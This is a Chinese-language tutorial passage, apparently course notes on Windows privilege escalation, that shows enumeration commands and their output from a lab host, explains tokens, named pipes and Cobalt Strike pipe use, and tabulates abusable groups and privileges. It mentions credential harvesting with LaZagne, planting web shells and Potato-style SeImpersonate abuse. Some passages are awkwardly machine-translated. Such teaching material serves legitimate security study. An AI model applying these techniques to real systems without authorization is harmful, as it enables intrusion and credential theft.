BIOS Version:              VMware, Inc. VMW71.00V.16707776.B64.2008070230, 8/7/2020
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume2
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-08:00) Pacific Time (US &amp; Canada)
Total Physical Memory:     6,143 MB
Available Physical Memory: 3,474 MB
Virtual Memory: Max Size:  10,371 MB
Virtual Memory: Available: 7,544 MB
Virtual Memory: In Use:    2,827 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              \\WINLPE-SRV01
Hotfix(s):                 3 Hotfix(s) Installed.
                           [01]: KB3199986
                           [02]: KB5001078
                           [03]: KB4103723
Network Card(s):           2 NIC(s) Installed.
                           [01]: Intel(R) 82574L Gigabit Network Connection
                                 Connection Name: Ethernet0
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.129.0.1
                                 IP address(es)
                                 [01]: 10.129.43.8
                                 [02]: fe80::e4db:5ea3:2775:8d4d
                                 [03]: dead:beef::e4db:5ea3:2775:8d4d
                           [02]: vmxnet3 Ethernet Adapter
                                 Connection Name: Ethernet1
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 192.168.20.56
                                 [02]: fe80::f055:fefd:b1b:9919
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.</code></pre>
<p><strong>补丁与更新</strong> 如果 <code>systeminfo</code> 不显示热修复，可以通过 <a href="https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page" target="_blank" rel="noreferrer">WMI-Command</a> 二进制和 QFE（快速修复工程） 来查询补丁。</p>
<pre><code class="language-cmd-session">C:\htb&gt; wmic qfe

Caption                                     CSName        Description      FixComments  HotFixID   InstallDate  InstalledBy          InstalledOn  Name  ServicePackInEffect  Status
http://support.microsoft.com/?kbid=3199986  WINLPE-SRV01  Update                        KB3199986               NT AUTHORITY\SYSTEM  11/21/2016
https://support.microsoft.com/help/5001078  WINLPE-SRV01  Security Update               KB5001078               NT AUTHORITY\SYSTEM  3/25/2021
http://support.microsoft.com/?kbid=4103723  WINLPE-SRV01  Security Update               KB4103723               NT AUTHORITY\SYSTEM  3/25/2021</code></pre>
<p>我们也可以用 PowerShell 通过 Get-Hotfix cmdlet 实现这一点。</p>
<pre><code class="language-powershell-session">PS C:\htb&gt; Get-HotFix | ft -AutoSize

Source       Description     HotFixID  InstalledBy                InstalledOn
------       -----------     --------  -----------                -----------
WINLPE-SRV01 Update          KB3199986 NT AUTHORITY\SYSTEM        11/21/2016 12:00:00 AM
WINLPE-SRV01 Update          KB4054590 WINLPE-SRV01\Administrator 3/30/2021 12:00:00 AM
WINLPE-SRV01 Security Update KB5001078 NT AUTHORITY\SYSTEM        3/25/2021 12:00:00 AM
WINLPE-SRV01 Security Update KB3200970 WINLPE-SRV01\Administrator 4/13/2021 12:00:00 AM</code></pre>
<p><strong>已安装的程序</strong> WMI 也可以用于显示已安装的软件。这些信息常常能引导我们找到难以发现的漏洞。<code>FileZilla</code>/<code>Putty</code> 等安装了吗？运行 <code>LaZagne</code> 检查这些应用存储的凭证是否已安装。此外，有些程序可能被安装并作为易受攻击的服务运行。</p>
<pre><code class="language-cmd-session">C:\htb&gt; wmic product get name

Name
Microsoft Visual C++ 2019 X64 Additional Runtime - 14.24.28127
Java 8 Update 231 (64-bit)
Microsoft Visual C++ 2019 X86 Additional Runtime - 14.24.28127
VMware Tools
Microsoft Visual C++ 2019 X64 Minimum Runtime - 14.24.28127
Microsoft Visual C++ 2019 X86 Minimum Runtime - 14.24.28127
Java Auto Updater

&lt;SNIP&gt;</code></pre>
<p>当然，我们也可以用 PowerShell 使用 Get-WmiObject cmdlet 实现这一点。</p>
<pre><code class="language-powershell-session">PS C:\htb&gt; Get-WmiObject -Class Win32_Product |  select Name, Version

Name                                                                    Version
----                                                                    -------
SQL Server 2016 Database Engine Shared                                  13.2.5026.0
Microsoft OLE DB Driver for SQL Server                                  18.3.0.0
Microsoft Visual C++ 2010  x64 Redistributable - 10.0.40219             10.0.40219
Microsoft Help Viewer 2.3                                               2.3.28107
Microsoft Visual C++ 2010  x86 Redistributable - 10.0.40219             10.0.40219
Microsoft Visual C++ 2013 x86 Minimum Runtime - 12.0.21005              12.0.21005
Microsoft Visual C++ 2013 x86 Additional Runtime - 12.0.21005           12.0.21005
Microsoft Visual C++ 2019 X64 Additional Runtime - 14.28.29914          14.28.29914
Microsoft ODBC Driver 13 for SQL Server                                 13.2.5026.0
SQL Server 2016 Database Engine Shared                                  13.2.5026.0
SQL Server 2016 Database Engine Services                                13.2.5026.0
SQL Server Management Studio for Reporting Services                     15.0.18369.0
Microsoft SQL Server 2008 Setup Support Files                           10.3.5500.0
SSMS Post Install Tasks                                                 15.0.18369.0
Microsoft VSS Writer for SQL Server 2016                                13.2.5026.0
Java 8 Update 231 (64-bit)                                              8.0.2310.11
Browser for SQL Server 2016                                             13.2.5026.0
Integration Services                                                    15.0.2000.130

&lt;SNIP&gt;</code></pre>
<p><strong>显示运行进程</strong> <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/netstat" target="_blank" rel="noreferrer">netstat</a> 命令会显示当前的 TCP 和 UDP 连接，这能让我们更好地了解哪些服务在本地和外部可访问的端口上监听。我们可能会发现只有本地主机（登录主机时）才能访问的有漏洞服务，可以利用它来升级权限。</p>
<pre><code class="language-cmd-session">PS C:\htb&gt; netstat -ano

Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:21             0.0.0.0:0              LISTENING       1096
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       840
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:1433           0.0.0.0:0              LISTENING       3520
  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       968
&lt;...SNIP...&gt;

netstat -ano | findstr :8080

tasklist /svc | findstr 2400

</code></pre>
<p><strong>User &amp; Group 信息</strong> 用户往往是组织中最薄弱的一环，尤其是在系统配置和打补丁良好的情况下。了解系统中的用户和组、能够提供管理员权限的特定组成员、当前用户的权限、密码策略信息以及我们可能针对的登录用户，这一点至关重要。我们可能觉得系统已经打了很强的补丁，但本地管理员组的用户目录中有成员可以浏览，并且包含像 <code>logins.xlsx</code> 这样的密码文件，因此很容易获胜。</p>
<p><strong>已登陆用户，Logged-In Users</strong> 确定哪些用户登录系统始终很重要。它们是闲置还是活跃？我们能确定他们在做什么吗？虽然执行起来更具挑战性，但有时我们可以直接攻击用户以提升权限或获得更多访问权限。在规避交战中，我们需要在主机上小心翼翼地行动，同时其他用户正在作，以避免被发现。</p>
<pre><code class="language-cmd-session">C:\htb&gt; query user

 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
&gt;administrator         rdp-tcp#2           1  Active          .  3/25/2021 9:27 AM</code></pre>
<p><strong>当前用户, Current User</strong> 当我们访问主机时，应该先检查账户运行的用户环境。有时候，我们已经是系统或同等存在了！假设我们以服务账户身份获得访问权限。在这种情况下，我们可能拥有像 <code>SeImpersonatePrivilege</code> 这样的权限，这些权限常常很容易被滥用，用 <a href="https://github.com/ohpe/juicy-potato" target="_blank" rel="noreferrer">Juicy Potato</a> 等工具升级权限。</p>
<pre><code class="language-cmd-session">C:\htb&gt; echo %USERNAME%

htb-student </code></pre>
<p><strong>当前用户权限</strong> 如前所述，了解用户拥有哪些权限，有助于提升权限。我们本模块后面将探讨个人用户权限和升级路径。</p>
<pre><code class="language-cmd-session">C:\htb&gt; whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled</code></pre>
<p><strong>当前用户组信息</strong> 我们的用户是否通过组成员身份继承了任何权利？它们是否在 Active Directory 域环境中享有特权，可以用来访问更多系统？</p>
<pre><code class="language-cmd-session">C:\htb&gt; whoami /groups

GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes
====================================== ================ ============ ==================================================
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Desktop Users           Alias            S-1-5-32-555 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\REMOTE INTERACTIVE LOGON  Well-known group S-1-5-14     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE               Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                  Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192</code></pre>
<p><strong>获取所有用户</strong> 了解系统上的其他用户也很重要。如果我们通过为用户 <code>bob</code> 捕获的凭据获得 RDP 访问主机，并且在本地管理员组中看到 <code>bob_adm</code> 用户，值得检查凭证是否复用。我们能访问重要用户的用户档案目录吗？我们可能会在用户的桌面、文档或下载文件夹中找到有价值的文件，如带有密码或 SSH 密钥的脚本。</p>
<pre><code class="language-cmd-session">C:\htb&gt; net user

User accounts for \\WINLPE-SRV01

-------------------------------------------------------------------------------
Administrator            DefaultAccount           Guest
helpdesk                 htb-student              jordan
sarah                    secsvc
The command completed successfully.</code></pre>
<p><strong>获取所有的组</strong> 了解主机上存在哪些非标准组可以帮助我们判断主机的用途、访问频率，甚至可能导致发现配置错误，比如远程桌面中的所有域用户或本地管理员组。</p>
<pre><code class="language-cmd-session">C:\htb&gt; net localgroup

Aliases for \\WINLPE-SRV01

-------------------------------------------------------------------------------
*Access Control Assistance Operators
*Administrators
*Backup Operators
*Certificate Service DCOM Access
*Cryptographic Operators
*Distributed COM Users
*Event Log Readers
*Guests
*Hyper-V Administrators
*IIS_IUSRS
*Network Configuration Operators
*Performance Log Users
*Performance Monitor Users
*Power Users
*Print Operators
*RDS Endpoint Servers
*RDS Management Servers
*RDS Remote Access Servers
*Remote Desktop Users
*Remote Management Users
*Replicator
*Storage Replica Administrators
*System Managed Accounts Group
*Users
The command completed successfully.</code></pre>
<p><strong>一个组的详细信息</strong> 值得查看非标准团体的详细信息。虽然不太可能，但我们可能会在该群组的描述中找到密码或其他有趣的信息。在列举过程中，我们可能会发现另一位非管理员用户的凭证，他是本地组成员，可用于升级权限。</p>
<pre><code class="language-cmd-session">C:\htb&gt; net localgroup administrators

Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
helpdesk
sarah
secsvc
The command completed successfully. </code></pre>
<p><strong>获取密码政策及其他账户信息</strong></p>
<pre><code class="language-cmd-session">C:\htb&gt; net accounts

Force user logoff how long after time expires?:       Never
Minimum password age (days):                          0
Maximum password age (days):                          42
Minimum password length:                              0
Length of password history maintained:                None
Lockout threshold:                                    Never
Lockout duration (minutes):                           30
Lockout observation window (minutes):                 30
Computer role:                                        SERVER
The command completed successfully.</code></pre>
<h3>与进程交互</h3>
<p>寻找权限升级的最佳地点之一是系统上正在运行的进程。即使进程不以管理员身份运行，也可能获得额外的权限。最常见的例子是发现一台像 IIS 或 XAMPP 这样的 Web 服务器运行在主机上，放置 <code>aspx/php</code> shell，并以运行 Web 服务器的用户身份获得 shell。通常，这不是管理员，但通常会有 <code>SeImpersonate</code> 令牌，允许 <code>Rogue/Juicy/Lonely Potato</code> 提供系统权限。</p>
<p><strong>Access Tokens 访问令牌</strong> 在 Windows 中， 访问令牌用于描述进程或线程的安全上下文（安全属性或规则）。令牌包含用户账户身份信息以及与特定进程或线程相关的权限。当用户向系统进行身份验证时，其密码会通过安全数据库进行验证，如果正确认证，他们将获得一个访问令牌。每当用户与进程交互时，都会显示该令牌的副本以确定其权限等级。</p>
<h3>枚举网络服务</h3>
<p>人们与进程交互最常见的方式是通过网络套接字（DNS、HTTP、SMB 等）。<a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/netstat" target="_blank" rel="noreferrer">netstat</a> 命令会显示当前的 TCP 和 UDP 连接，这能让我们更好地了解哪些服务在本地和外部可访问的端口上监听。我们可能会发现只有本地主机登录后才能访问的漏洞服务，可以利用它来升级权限。</p>
<p><strong>显示主动网络连接</strong></p>
<pre><code class="language-cmd-session">C:\htb&gt; netstat -ano

Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:21             0.0.0.0:0              LISTENING       3812
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       836
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       936
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:8080           0.0.0.0:0              LISTENING       5044
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       528
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       996
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1260
  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       2008
  TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING       600
  TCP    0.0.0.0:49670          0.0.0.0:0              LISTENING       1888
  TCP    0.0.0.0:49674          0.0.0.0:0              LISTENING       616
  TCP    10.129.43.8:139        0.0.0.0:0              LISTENING       4
  TCP    10.129.43.8:3389       10.10.14.3:63191       ESTABLISHED     936
  TCP    10.129.43.8:49671      40.67.251.132:443      ESTABLISHED     1260
  TCP    10.129.43.8:49773      52.37.190.150:443      ESTABLISHED     2608
  TCP    10.129.43.8:51580      40.67.251.132:443      ESTABLISHED     3808
  TCP    10.129.43.8:54267      40.67.254.36:443       ESTABLISHED     3808
  TCP    10.129.43.8:54268      40.67.254.36:443       ESTABLISHED     1260
  TCP    10.129.43.8:54269      64.233.184.189:443     ESTABLISHED     2608
  TCP    10.129.43.8:54273      216.58.210.195:443     ESTABLISHED     2608
  TCP    127.0.0.1:14147        0.0.0.0:0              LISTENING       3812

&lt;SNIP&gt;

  TCP    192.168.20.56:139      0.0.0.0:0              LISTENING       4
  TCP    [::]:21                [::]:0                 LISTENING       3812
  TCP    [::]:80                [::]:0                 LISTENING       4
  TCP    [::]:135               [::]:0                 LISTENING       836
  TCP    [::]:445               [::]:0                 LISTENING       4
  TCP    [::]:3389              [::]:0                 LISTENING       936
  TCP    [::]:5985              [::]:0                 LISTENING       4
  TCP    [::]:8080              [::]:0                 LISTENING       5044
  TCP    [::]:47001             [::]:0                 LISTENING       4
  TCP    [::]:49664             [::]:0                 LISTENING       528
  TCP    [::]:49665             [::]:0                 LISTENING       996
  TCP    [::]:49666             [::]:0                 LISTENING       1260
  TCP    [::]:49668             [::]:0                 LISTENING       2008
  TCP    [::]:49669             [::]:0                 LISTENING       600
  TCP    [::]:49670             [::]:0                 LISTENING       1888
  TCP    [::]:49674             [::]:0                 LISTENING       616
  TCP    [::1]:14147            [::]:0                 LISTENING       3812
  UDP    0.0.0.0:123            *:*                                    1104
  UDP    0.0.0.0:500            *:*                                    1260
  UDP    0.0.0.0:3389           *:*                                    936

&lt;SNIP&gt;</code></pre>
<p>使用主动网络连接时，主要要注意的是那些在环回地址（<code>127.0.0.1</code> 和 <code>：：1</code>）上监听的条目，这些条目没有监听 IP 地址（<code>10.129.43.8</code>）或广播地址（<code>0.0.0.0</code>，<code>：：/0</code>）。原因是 localhost 上的网络套接字通常不安全，因为人们认为“它们无法被网络访问”。最明显的是 <code>14147</code> 号端口，用于 FileZilla 的管理界面。通过连接该端口，除了作为 FileZilla 服务器用户（可能是管理员）创建 f.P 共享的 c：\外，可能还能提取 FTP 密码。</p>
<h3>命名管道</h3>
<p>进程之间的另一种通信方式是通过命名管道。管道本质上是存储在内存中的文件，读取后会被清除。钴打击为每个命令（不含 <a href="https://www.cobaltstrike.com/help-beacon-object-files" target="_blank" rel="noreferrer">BOF</a>）使用命名管道。工作流程基本如下：</p>
<p>信标启动了一条名为 \.\pipe\ 的管道 msagent_12</p>
<p>信标启动一个新进程，并向该进程注入命令，将输出导向 \.\pipe\msagent_12</p>
<p>服务器显示写入 \.\pipe\ 的内容 msagent_12</p>
<ol><li>Beacon starts a named pipe of \.\pipe\msagent_12</li><li>Beacon starts a new process and injects command into that process directing output to \.\pipe\msagent_12</li><li>Server displays what was written into \.\pipe\msagent_12</li></ol>
<p>这样做是因为如果被执行的命令被杀毒软件标记或崩溃，它不会影响信标（执行该命令的进程）。Cobalt Strike 用户经常会更换命名的管道，伪装成另一个程序。最常见的例子之一是用 mojo 代替 msagent。我最喜欢的发现之一是找到了一个带有 Mojo 的命名管道启动器，但电脑本身并没有安装 Chrome。幸运的是，这正是公司内部的红队。当外部顾问找到红队，而内部蓝队却没有时，这说明了很多问题。</p>
<p>管道用于两个应用程序或进程之间的通信，使用共享内存。管道分为两种类型， 命名管道和匿名管道。命名管道的一个例子是 <code>\\.\PipeName\\ExampleNamedPipeServer</code> 。Windows 系统使用客户端-服务器实现管道通信。在这种实现中，创建命名管道的进程是服务器，与命名管道通信的进程是客户端。命名管道可以通过<code>半双工</code>通信，或单向通道，客户端只能将数据写入服务器;或双<code>工</code> ，这是一种双向通信通道，允许客户端通过管道写入数据，服务器通过该管道回应数据。每一次与命名管道服务器的活跃连接都会生成一个新的命名管道。这些管道名称相同，但通过不同的数据缓冲区进行通信。</p>
<p><strong>用管道列表列出命名管道</strong></p>
<pre><code class="language-cmd-session">C:\htb&gt; pipelist.exe /accepteula

PipeList v1.02 - Lists open named pipes
Copyright (C) 2005-2016 Mark Russinovich
Sysinternals - www.sysinternals.com

Pipe Name                                    Instances       Max Instances
---------                                    ---------       -------------
InitShutdown                                      3               -1
lsass                                             4               -1
ntsvcs                                            3               -1
scerpc                                            3               -1
Winsock2\CatalogChangeListener-340-0              1                1
Winsock2\CatalogChangeListener-414-0              1                1
epmapper                                          3               -1
Winsock2\CatalogChangeListener-3ec-0              1                1
Winsock2\CatalogChangeListener-44c-0              1                1
LSM_API_service                                   3               -1
atsvc                                             3               -1
Winsock2\CatalogChangeListener-5e0-0              1                1
eventlog                                          3               -1
Winsock2\CatalogChangeListener-6a8-0              1                1
spoolss                                           3               -1
Winsock2\CatalogChangeListener-ec0-0              1                1
wkssvc                                            4               -1
trkwks                                            3               -1
vmware-usbarbpipe                                 5               -1
srvsvc                                            4               -1
ROUTER                                            3               -1
vmware-authdpipe                                  1                1

&lt;SNIP&gt;</code></pre>
<p>此外，我们还可以用 PowerShell 使用 <code>gci</code>（<code>Get-ChildItem</code>）列出命名管道。</p>
<p><strong>用 PowerShell 列出命名管道</strong></p>
<pre><code class="language-powershell-session">PS C:\htb&gt;  gci \\.\pipe\


    Directory: \\.\pipe


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
------       12/31/1600   4:00 PM              3 InitShutdown
------       12/31/1600   4:00 PM              4 lsass
------       12/31/1600   4:00 PM              3 ntsvcs
------       12/31/1600   4:00 PM              3 scerpc


    Directory: \\.\pipe\Winsock2


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
------       12/31/1600   4:00 PM              1 Winsock2\CatalogChangeListener-34c-0


    Directory: \\.\pipe


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
------       12/31/1600   4:00 PM              3 epmapper

&lt;SNIP&gt;</code></pre>
<p>获得命名管道列表后，我们可以使用 <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk" target="_blank" rel="noreferrer">Accesschk</a> 通过查看自由裁量访问列表（DACL）来枚举特定命名管道的权限，DACL 显示谁拥有修改、写入、读取或执行资源的权限。让我们来看看 <code>LSASS</code> 的流程。我们也可以使用命令 <code>.\accesschk.exe /accepteula \pipe\</code> 来审查所有命名管道的 DACL 。</p>
<h2>用户权限</h2>
<p>中的权限是指账户可以被授予在本地系统上执行各种作的权利，比如管理服务、加载驱动程序、关闭系统、调试应用程序等。权限不同于访问权，后者是系统用来授予或拒绝访问可保护对象的。用户和组权限存储在数据库中，用户登录系统时通过访问令牌授予。账户可以对特定计算机拥有本地权限，如果账户属于 Active Directory 域，则在不同系统上拥有不同的权限。每当用户尝试执行特权作时，系统会检查该用户的访问令牌，以确认账户是否具备所需权限，如果有，会检查这些令牌是否已被启用。大多数权限默认是被禁用的。有些可以通过打开管理 cmd.exe 或 PowerShell 控制台来启用，而另一些则可以通过手动启用。</p>
<p>评估的目标通常是获得对一个或多个系统的管理访问权限。假设我们可以以特定权限用户身份登录系统。在这种情况下，我们或许可以利用内置功能直接提升权限，或者利用目标账户分配的权限来进一步提升访问权限，以实现最终目标。</p>
<p><strong>Windows授权流程</strong> 安全主体是指任何可以被 Windows 作系统认证的对象，包括用户账户和计算机账户、在安全上下文中运行的进程，或其他用户/计算机账户，或这些账户所属的安全组。安全主体是控制 Windows 主机资源访问的主要方式。每个安全主体都由唯一的安全标识符（SID） 标识。当创建安全主体时，会被分配一个 SID，该 SID 在其生命周期内一直分配给该主体。</p>
<p>下图从高层次讲解了 Windows 授权和访问控制流程，例如，当用户尝试访问文件共享中的可安全对象（如文件夹）时，该过程就开始了。在此过程中，用户的访问令牌（包括其用户 SID、其所属组的 SID、权限列表及其他访问信息）会与对象安全描述符内的访问控制条目（ACEs）进行比较（ACEs，ACEs 包含可保护对象的安全信息，如授予用户或组的访问权，下文将讨论）。一旦比较完成，就会决定是否授予访问。每当用户尝试访问 Windows 主机上的资源时，整个过程几乎瞬间发生。作为我们列举和特权提升活动的一部分，我们试图利用和滥用访问权，利用或介入该授权流程，以进一步推进目标的访问。</p>
<img src="assets/posts/windows-privilege-escalation/Pasted image 20260228022956.png" alt="Pasted image 20260228022956" />
<p><strong>Windows中的权力与特权，Rights and Privileges</strong> Windows 包含许多赋予成员强大权利和特权的群体。其中许多都可能被滥用，在独立的 Windows 主机和 Active Directory 域环境中提升权限。最终，这些资源可以用来获得 Windows 工作站、服务器或域控制器（DC）上的域管理员、本地管理员或系统权限。以下列出其中一些团体。</p>
<div class="post-table-wrap"><table><thead><tr><th><strong>Group  集团</strong></th><th><strong>Description  描述</strong></th></tr></thead><tbody><tr><td>默认管理员</td><td>域管理员和企业管理员是“超级”组。</td></tr><tr><td>服务器运营者</td><td>成员可以修改服务、访问 SMB 共享和备份文件。</td></tr><tr><td>备用</td><td>成员可以本地登录 DC，应被视为域管理员。他们可以复制 SAM/NTDS 数据库的影子副本，远程读取注册表，并通过 SMB 访问 DC 上的文件系统。该组有时会加入非 DC 的本地备份组。</td></tr><tr><td>打印</td><td>成员可以登录本地的 DC，并“欺骗”Windows 加载恶意驱动程序。</td></tr><tr><td>管理员</td><td>如果存在虚拟数据中心，任何虚拟化管理员，如 Hyper-V 管理员成员，都应被视为域管理员。</td></tr><tr><td>账户运营方</td><td>成员可以修改域内非受保护的账户和组。</td></tr><tr><td>远程桌面用户</td><td>成员默认没有任何有用的权限，但通常会被赋予额外权限 <code>Allow Login Through Remote Desktop Services</code> ，比如，并且可以通过 RDP 协议进行横向移动。</td></tr><tr><td>远程管理用户</td><td>成员可以通过 PSRemoting 登录 DC（该组有时会加入非 DC 的本地远程管理组）。</td></tr><tr><td>组策略创建者所有者</td><td>成员可以创建新的 GPO，但需要被授权额外权限才能将 GPO 关联到容器，如域或 OU。</td></tr><tr><td>模式管理员</td><td>成员可以通过在默认对象 ACL 中添加被攻破的账户来修改 Active Directory 的模式结构，并对任何待创建的 Group/GPO 进行背门。</td></tr><tr><td>管理员</td><td>成员可以在 DC 上加载 DLL，但没有重启 DNS 服务器的必要权限。他们可以加载恶意 DLL，等待重启作为持久化机制。加载 DLL 通常会导致服务崩溃。利用该群体的更可靠方法是创建一个 WPAD 记录 。</td></tr></tbody></table></div>
<p><strong>用户权利转让</strong> 根据组成员身份以及通过域和本地组策略分配的权限等其他因素，用户可能会为其账户分配各种权限。这篇关于用户权利转让的 Microsoft 文章详细说明了 Windows 中可设置的每种用户权限以及适用于每个权限的安全考虑。以下是一些关键的用户权限分配，这些设置是应用于本地主机的。这些权限允许用户在系统上执行任务，如本地或远程登录、从网络访问主机、关闭服务器等。</p>
<div class="post-table-wrap"><table><thead><tr><th>设定常数</th><th>设定名称</th><th>标准作业</th><th>描述</th></tr></thead><tbody><tr><td>SeNetworkLogonRight</td><td>从网络访问这台电脑](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/access-this-computer-from-the-network)</td><td>管理员，认证用户</td><td>决定哪些用户可以从网络连接到该设备。这被 SMB、NetBIOS、CIFS 和 COM+等网络协议要求。</td></tr><tr><td>SeRemoteInteractiveLogonRight</td><td>允许通过远程桌面服务登录](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/allow-log-on-through-remote-desktop-services)</td><td>管理员，远程桌面用户</td><td>该策略设置决定哪些用户或组可以通过远程桌面服务连接访问远程设备的登录界面。用户可以建立与特定服务器的远程桌面服务连接，但无法登录该服务器的控制台。</td></tr><tr><td>SeBackupPrivilege  SeeBackupPrivilege</td><td>备份文件和目录](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/back-up-files-and-directories)</td><td>管理人员</td><td>该用户权限决定哪些用户可以绕过文件和目录、注册表及其他持久对象权限以备份系统。</td></tr><tr><td>SeSecurityPrivilege</td><td>管理审计和安全日志](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/manage-auditing-and-security-log)</td><td>管理人员</td><td>该策略设置决定哪些用户可以为单个资源（如文件、Active Directory 对象和注册表键）指定对象访问审计选项。这些对象指定其系统访问控制列表（SACL）。被赋予该用户权限的用户也可以在事件查看器中查看并清除安全日志。</td></tr><tr><td>特权</td><td>拥有文件或其他对象](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/take-ownership-of-files-or-other-objects)</td><td>管理人员</td><td>该策略设置决定哪些用户可以拥有设备中任何可保护的对象，包括 Active Directory 对象、NTFS 文件和文件夹、打印机、注册表键、服务、进程和线程。</td></tr><tr><td>SeDebugPrivilege</td><td>调试程序</td><td>管理人员</td><td>该策略设置决定哪些用户可以连接或打开任何进程，即使是他们不拥有的进程。调试应用程序的开发者不需要这个用户权限。调试新系统组件的开发者需要这个用户权限。该用户权利允许访问敏感且关键的作系统组件。</td></tr><tr><td>冒充特权</td><td>认证后冒充客户端](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/impersonate-a-client-after-authentication)</td><td>管理员，本地服务，网络服务，服务</td><td>该策略设置决定哪些程序可以冒充用户或其他指定账户并代表用户行动。</td></tr><tr><td>SeLoadDriverPrivilege</td><td>加载和卸载设备驱动程序](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/load-and-unload-device-drivers)</td><td>管理人员</td><td>该策略设置决定哪些用户可以动态加载和卸载设备驱动程序。如果设备上的 driver.cab 文件中已有新硬件的签名驱动，则无需使用此用户权利。设备驱动程序作为高权限代码运行。</td></tr><tr><td>SeRestorePrivilege  SeeRestorePrivilege</td><td>还原文件和目录](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/restore-files-and-directories)</td><td>管理人员</td><td>该安全设置决定哪些用户在恢复备份文件和目录时可以绕过文件、目录、注册表及其他持久对象权限。它决定哪些用户可以作为对象的所有者设置有效的安全主体。</td></tr><tr><td>特权</td><td>作为作系统的一部分](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/act-as-part-of-the-operating-system)</td><td>管理员，本地服务，网络服务，服务</td><td>该安全设置决定进程是否可以冒充任何用户身份，并通过此获取目标用户被允许访问的资源（冒充）。这可能被分配给杀毒或备份工具，需要访问所有系统文件进行扫描或备份。该权限应保留给需要合法访问的服务账户。</td></tr></tbody></table></div>
<p>输入命令 <code>whoami /priv</code> 会显示分配给你当前用户的所有用户权限列表。有些权限仅对管理员用户开放，且只能在运行提升级的命令或 PowerShell 会话时列出或利用。这些提升权限和用户账户控制（UAC） 的概念是 Windows Vista 引入的安全功能，默认限制应用程序在非必要时无法完全权限运行。如果我们比较管理员在非提升控制台和升级控制台上可享有的权利，会发现它们差别很大。</p>
<p>以下是windows系统上本地管理员账户可用的权限</p>
<p><strong>本地管理员用户权限 - 提升</strong></p>
<pre><code class="language-powershell-session">PS C:\htb&gt; whoami 

winlpe-srv01\administrator


PS C:\htb&gt; whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== ========
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Disabled
SeSecurityPrivilege                       Manage auditing and security log                                   Disabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled
SeSystemProfilePrivilege                  Profile system performance                                         Disabled
SeSystemtimePrivilege                     Change the system time                                             Disabled
SeProfileSingleProcessPrivilege           Profile single process                                             Disabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Disabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Disabled
SeBackupPrivilege                         Back up files and directories                                      Disabled
SeRestorePrivilege                        Restore files and directories                                      Disabled
SeShutdownPrivilege                       Shut down the system                                               Disabled
